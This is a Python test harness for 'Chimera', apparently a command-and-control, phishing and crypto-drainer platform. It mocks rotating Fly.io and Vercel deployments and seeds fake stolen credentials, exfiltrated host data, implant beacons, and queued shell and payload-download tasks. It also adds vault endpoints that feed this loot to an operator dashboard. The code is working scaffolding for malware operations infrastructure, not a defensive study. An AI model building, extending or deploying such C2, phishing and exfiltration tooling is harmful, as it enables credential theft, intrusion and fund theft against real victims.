# local_test.py — Local testing harness for Chimera
# Runs the payload server + dashboard locally with mock data.
# No Fly.io, Vercel, proxies, or GitHub needed.
#
# Usage: python local_test.py
# Dashboard: http://localhost:4444
# Payload API: http://localhost:8443

import threading
import time
import secrets
import json
import os
import sys
from http.server import HTTPServer
from datetime import datetime, timezone
from typing import Any, cast

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.payload_server import PayloadServer
from dashboard.dashboard import app as dash_app, state as dash_state, DashboardState


# ---------------------------------------------------------------
# Mock config — fake credentials, local-only
# ---------------------------------------------------------------
MOCK_CONFIG: dict[str, str] = {
    "fly_api_token": "mock-token",
    "fly_org": "mock-org",
    "fly_region": "iad",
    "fly_app_base": "chimera-c2-test",
    "vercel_api_token": "mock-token",
    "vercel_team": "mock-team",
    "vercel_project_base": "cloudsync-test",
    "github_token": "mock-token",
    "gist_id": "mock-gist-id",
    "proxy_provider": "none",
    "proxy_user": "mock",
    "proxy_pass": "mock",
    "proxy_endpoint": "localhost:0",
    "cycle_minutes": "60",
}


# ---------------------------------------------------------------
# Mock rotation engine — doesn't call any real APIs
# ---------------------------------------------------------------
class MockRotationEngine:
    """Simulates the rotation engine without touching real infrastructure."""

    def __init__(self) -> None:
        self.current: dict[str, Any] | None = None
        self._running = False
        self._cycle_count = 0

    def start(self) -> None:
        self._running = True
        # Create initial mock session immediately
        self._create_mock_session()

    def stop(self) -> None:
        self._running = False

    def _create_mock_session(self) -> None:
        ts = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
        session_key = secrets.token_hex(16)
        deployment_seed = secrets.token_hex(16)
        self._cycle_count += 1

        self.current = {
            "fly": {
                "app_name": f"chimera-c2-test-{ts}",
                "vm_id": f"vm_{secrets.token_hex(8)}",
                "ip": "127.0.0.1",
                "internal_port": 8443,
                "session_key": session_key,
                "deployment_seed": deployment_seed,
                "region": "iad",
            },
            "fly_sessions": [
                {
                    "app_name": f"chimera-c2-test-{ts}",
                    "vm_id": f"vm_{secrets.token_hex(8)}",
                    "ip": "127.0.0.1",
                    "internal_port": 8443,
                    "session_key": session_key,
                    "deployment_seed": deployment_seed,
                    "region": "iad",
                    "payload_type": "malware_api",
                    "payload_id": "c2-api",
                },
                {
                    "app_name": f"chimera-flipper-test-{ts}",
                    "vm_id": f"vm_{secrets.token_hex(8)}",
                    "ip": "127.0.0.1",
                    "internal_port": 8443,
                    "session_key": session_key,
                    "deployment_seed": deployment_seed,
                    "region": "iad",
                    "payload_type": "telemetry_platform",
                    "payload_id": "flipper-telemetry",
                    "image": "registry.fly.io/chimera-flipper:latest",
                },
            ],
            "vercel": [
                {
                    "project_name": f"cloudsync-phish-{ts}",
                    "project_id": f"prj_{secrets.token_hex(8)}",
                    "deployment_url": f"cloudsync-phish-{ts}.vercel.app",
                    "deployment_id": f"dpl_{secrets.token_hex(12)}",
                },
                {
                    "project_name": f"cloudsync-drainer-{ts}",
                    "project_id": f"prj_{secrets.token_hex(8)}",
                    "deployment_url": f"cloudsync-drainer-{ts}.vercel.app",
                    "deployment_id": f"dpl_{secrets.token_hex(12)}",
                },
                {
                    "project_name": f"cloudsync-flipper-{ts}",
                    "project_id": f"prj_{secrets.token_hex(8)}",
                    "deployment_url": f"cloudsync-flipper-{ts}.vercel.app",
                    "deployment_id": f"dpl_{secrets.token_hex(12)}",
                },
            ],
            "proxy": {
                "proxy_url": "http://mock-session:mock@localhost:0",
                "proxy_auth": "mock-session:mock",
                "session_id": secrets.token_hex(8),
                "exit_ip": "203.0.113.42",  # RFC 5737 documentation IP
                "rotation_token": secrets.token_hex(8),
            },
            "config": {
                "v": 2,
                "ts": ts,
                "ts_epoch": time.time(),
                "key": session_key,
                "seed": deployment_seed,
                "endpoints": {
                    "api": "https://cloudsync-phish-test.vercel.app/api",
                    "phishing": "https://cloudsync-phish-test.vercel.app",
                    "drainer": "https://cloudsync-drainer-test.vercel.app",
                    "flipper": "https://cloudsync-flipper-test.vercel.app",
                    "fly-flipper-telemetry": "http://127.0.0.1:8443",
                },
                "px": secrets.token_hex(8),
            },
            "ts": ts,
        }
        print(f"[mock] Cycle {self._cycle_count} created: {ts}")
        print(f"[mock] Session key: {session_key[:16]}...")
        print(f"[mock] Endpoints: {len(self.current['config']['endpoints'])}")


# ---------------------------------------------------------------
# Seed fake data into the payload server
# ---------------------------------------------------------------
def seed_mock_data(session_key: str) -> None:
    """Populate the payload server with fake creds, exfil, and beacons."""
    # Seed credentials
    PayloadServer.seed_creds([
        {
            "ts": time.time() - 120,
            "ip": "192.168.1.105",
            "user": "jthompson@contoso.com",
            "pass": "Summer2024!",
            "raw": b'{"u":"jthompson@contoso.com","p":"Summer2024!","t":1700000000}',
        },
        {
            "ts": time.time() - 60,
            "ip": "10.0.0.24",
            "user": "admin@company.io",
            "pass": "P@ssw0rd123",
            "raw": b'{"u":"admin@company.io","p":"P@ssw0rd123","t":1700000060}',
        },
        {
            "ts": time.time() - 30,
            "ip": "172.16.0.8",
            "user": "sarah.m@techcorp.com",
            "pass": "hunter2",
            "raw": b'{"u":"sarah.m@techcorp.com","p":"hunter2","t":1700000090}',
        },
    ])

    # Seed exfil data
    PayloadServer.seed_exfil([
        {
            "ts": time.time() - 90,
            "ip": "192.168.1.105",
            "data": b"SYSTEM INFO:\nOS: Windows 11 Pro\nUser: jthompson\nHostname: DESKTOP-JT7HQ2\nProcesses: 142",
        },
        {
            "ts": time.time() - 45,
            "ip": "10.0.0.24",
            "data": b"FILE LIST /Users/admin/Documents:\n- passwords.txt\n- financials.xlsx\n- ssh_keys\n- .env",
        },
    ])

    # Seed beacons
    PayloadServer.seed_beacons({
        "implant-a1b2c3": {
            "last_seen": time.time() - 15,
            "ip": "192.168.1.105",
            "data": b"\x00\x01\x02",
        },
        "implant-d4e5f6": {
            "last_seen": time.time() - 300,
            "ip": "10.0.0.24",
            "data": b"\x00\x01\x03",
        },
        "implant-g7h8i9": {
            "last_seen": time.time() - 600,
            "ip": "172.16.0.8",
            "data": b"\x00\x01\x04",
        },
    })

    # Seed a queued task
    PayloadServer.seed_tasks({
        "implant-a1b2c3": [
            {"type": "shell", "data": "whoami", "ts": int(time.time())},
            {"type": "download", "data": "https://example.com/payload.exe", "ts": int(time.time())},
        ]
    })

    print(f"[mock] Seeded: {len(PayloadServer.get_creds())} creds, "
          f"{len(PayloadServer.get_exfil())} exfil, "
          f"{len(PayloadServer.get_beacons())} beacons, "
          f"{sum(len(v) for v in PayloadServer.get_tasks().values())} tasks")


# ---------------------------------------------------------------
# Add vault API endpoints to the payload server
# (These are the endpoints the dashboard syncs against)
# ---------------------------------------------------------------
original_do_get = PayloadServer.do_GET


def patched_do_get(self: PayloadServer) -> None:
    """Extended GET handler with vault endpoints for the dashboard."""
    path = self.path.split("?")[0]

    # Vault endpoints (dashboard pulls data from these)
    if path == "/api/vault/creds":
        if self.check_auth():
            creds_serializable: list[dict[str, Any]] = []
            for c in PayloadServer.get_creds():
                creds_serializable.append({
                    "ts": c["ts"],
                    "ip": c["ip"],
                    "user": c.get("user", ""),
                    "pass": c.get("pass", ""),
                    "raw": c.get("raw", b"").decode("utf-8", errors="replace") if isinstance(c.get("raw"), bytes) else str(c.get("raw", "")),
                })
            self.send_json_response({"creds": creds_serializable})
        else:
            self.send_json_response({"error": "unauthorized"}, status=401)
        return

    if path == "/api/vault/exfil":
        if self.check_auth():
            exfil_serializable: list[dict[str, Any]] = []
            for e in PayloadServer.get_exfil():
                raw = e.get("data", b"")
                if isinstance(raw, bytes):
                    raw = raw.decode("utf-8", errors="replace")
                exfil_serializable.append({
                    "ts": e["ts"],
                    "ip": e["ip"],
                    "data": raw,
                })
            self.send_json_response({"exfil": exfil_serializable})
        else:
            self.send_json_response({"error": "unauthorized"}, status=401)
        return

    if path == "/api/vault/beacons":
        if self.check_auth():
            beacons_serializable: dict[str, dict[str, Any]] = {}
            for bid, bdata in PayloadServer.get_beacons().items():
                beacons_serializable[bid] = {
                    "last_seen": bdata["last_seen"],
                    "ip": bdata["ip"],
                }
            self.send_json_response({"beacons": beacons_serializable})
        else:
            self.send_json_response({"error": "unauthorized"}, status=401)
        return

    # Fall through to original handler
    original_do_get(self)


# Patch the class
PayloadServer.do_GET = patched_do_get


# Also patch POST to handle /api/vault/tasks
original_do_post = PayloadServer.do_POST


def patched_do_post(self: PayloadServer) -> None:
    """Extended POST handler with task queue endpoint."""
    path = self.path.split("?")[0]
    content_length = int(self.headers.get("Content-Length", 0))
    body = self.rfile.read(content_length) if content_length > 0 else b""

    if path == "/api/vault/tasks":
        if self.check_auth():
            try:
                data = json.loads(body)
                implant_id = data.get("implant_id", "default")
                task = data.get("task", {})
                PayloadServer.queue_task(implant_id, task)
                self.send_json_response({"status": "queued"})
            except Exception as e:
                self.send_json_response({"error": str(e)}, status=400)
        else:
            self.send_json_response({"error": "unauthorized"}, status=401)
        return

    # Fall through to original handler
    original_do_post(self)


PayloadServer.do_POST = patched_do_post


# ---------------------------------------------------------------
# Mock dashboard state — uses mock engine instead of real one
# ---------------------------------------------------------------
def create_mock_dashboard():
    """Create a dashboard instance with mock state."""
    import requests as req_lib

    # Override the state with our mock
    mock_engine = MockRotationEngine()
    mock_engine.start()

    dash_state.engine = cast(Any, mock_engine)
    dash_state.config = cast(dict[str, Any], MOCK_CONFIG)
    dash_state.last_sync = time.time()

    mock_running = threading.Event()
    mock_running.set()

    def mock_sync_loop() -> None:
        base_url = "http://127.0.0.1:8443"

        while mock_running.is_set():
            session_key = mock_engine.current["config"]["key"] if mock_engine.current else ""
            headers = {"X-CSRF-Token": session_key}

            try:
                resp = req_lib.get(f"{base_url}/api/vault/creds", headers=headers, timeout=5)
                if resp.ok:
                    dash_state.creds_cache = resp.json().get("creds", [])
            except Exception:
                pass

            try:
                resp = req_lib.get(f"{base_url}/api/vault/exfil", headers=headers, timeout=5)
                if resp.ok:
                    dash_state.exfil_cache = resp.json().get("exfil", [])
            except Exception:
                pass

            try:
                resp = req_lib.get(f"{base_url}/api/vault/beacons", headers=headers, timeout=5)
                if resp.ok:
                    dash_state.beacons_cache = resp.json().get("beacons", {})
            except Exception:
                pass

            dash_state.last_sync = time.time()
            time.sleep(5)

    sync_thread = threading.Thread(target=mock_sync_loop, daemon=True)
    sync_thread.start()

    # Override queue_task to push to local payload server
    def mock_queue_task(self: DashboardState, implant_id: str, task: dict[str, Any]) -> None:
        self.tasks_queued.setdefault(implant_id, []).append(task)
        base_url = "http://127.0.0.1:8443"
        session_key = mock_engine.current["config"]["key"] if mock_engine.current else ""
        try:
            req_lib.post(
                f"{base_url}/api/vault/tasks",
                headers={"X-CSRF-Token": session_key},
                json={"implant_id": implant_id, "task": task},
                timeout=5,
            )
        except Exception:
            pass

    DashboardState.queue_task = mock_queue_task

    # Override get_dead_drop_config
    def mock_get_dd_config(self: DashboardState) -> dict[str, Any]:
        if mock_engine.current:
            return mock_engine.current["config"]
        return {"status": "initializing"}

    DashboardState.get_dead_drop_config = mock_get_dd_config

    return dash_app


# ---------------------------------------------------------------
# Main — start payload server + dashboard
# ---------------------------------------------------------------
def main():
    print("""
╔══════════════════════════════════════════════╗
║        ⚡ CHIMERA LOCAL TEST MODE            ║
╠══════════════════════════════════════════════╣
║  Dashboard:  http://localhost:4444           ║
║  Payload:    http://localhost:8443           ║
║  Mode:       MOCK (no cloud APIs)            ║
╚══════════════════════════════════════════════╝
    """)

    # 1. Initialize payload server
    session_key = secrets.token_hex(16)
    PayloadServer.SESSION_KEY = session_key
    PayloadServer.init_renderer(secrets.token_hex(16))

    # 2. Seed mock data
    seed_mock_data(session_key)

    # 3. Start payload server in background thread
    payload_server = HTTPServer(("0.0.0.0", 8443), PayloadServer)
    server_thread = threading.Thread(target=payload_server.serve_forever, daemon=True)
    server_thread.start()
    print(f"[payload] Listening on :8443 (key: {session_key[:16]}...)")

    # 4. Create mock dashboard
    app = create_mock_dashboard()

    # 5. Start dashboard
    print("[dashboard] Starting on http://localhost:4444")
    print("[dashboard] Mock data loaded — creds, exfil, beacons, tasks")
    print("\nPress Ctrl+C to stop.\n")

    try:
        app.run(host="0.0.0.0", port=4444, debug=False)
    except KeyboardInterrupt:
        print("\n[shutdown] Stopping...")
        payload_server.shutdown()
        print("[shutdown] Done.")


if __name__ == "__main__":
    main()
